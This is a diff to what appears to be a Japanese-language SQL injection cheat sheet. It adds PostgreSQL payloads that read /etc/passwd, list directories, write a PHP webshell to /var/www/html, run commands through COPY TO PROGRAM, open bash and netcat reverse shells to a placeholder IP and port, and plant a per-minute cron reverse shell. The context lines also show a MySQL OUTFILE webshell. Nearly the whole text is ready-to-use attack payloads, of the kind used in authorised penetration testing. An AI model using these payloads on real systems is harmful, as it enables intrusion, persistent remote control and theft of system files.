@@ -51,3 +51,31 @@ admin'-- -
 # ファイル書き込み
 ' UNION SELECT null,'<?php system($_GET["cmd"]);?>',null,null INTO OUTFILE /var/www/html/webshell.php-- -
 ```
+
+## PostgreSQLで使用できるクエリ
+```bash
+# データベース名とユーザー名表示
+' UNION SELECT null,current_database(),current_user(),null-- -
+# データ設定ディレクトリ表示
+' UNION SELECT null,current_setting('data_directory'),null,null-- -
+# ファイル読み込み
+' UNION SELECT null,pg_read_file('/etc/passwd',0,1000),null,null-- -
+' UNION SELECT null,pg_read_file('/etc/passwd')::text,null,null-- -
+# lsコマンド使用
+' UNION SELECT null,pg_ls_dir('/var/www/html'),null,null-- -
+# webシェル書き込み
+'; COPY (SELECT '<?php system($_GET["cmd"])?;>') TO '/var/www/html/shell.php';-- -
+# RCE(権限に依存)
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt';-- - idコマンド結果出力
+'; COPY (SELECT '') TO PROGRAM 'bash -i >&/dev/tcp/<IP>/<Port> 0>&1';-- - bashのリバースシェル
+'; COPY (SELECT '') TO PROGRAM 'bash -c "mkfifo /tmp/f; /bin/sh < /tmp/f | nc <IP> <Port> > /tmp/f"';-- -  名前付きパイプを使用したリバースシェル
+# 毎分実行のcron
+'; DROP TABLE IF EXISTS tmp_cron; CREATE TABLE tmp_cron(line text);-- -
+'; INSERT INTO tmp_cron VALUES ('*/1 * * * * root bash -c ''bash -i >&/dev/tcp/<IP>/<Port> 0>&1''');-- -
+'; COPY tmp_cron TO '/etc/cron.d/scheduler';-- -
+```
+
+## MSSQLServerで使用できるクエリ
+```bash
+' UNION SELECT null,DB_NAME(),SYSTEM_USER(),null-- -
+```
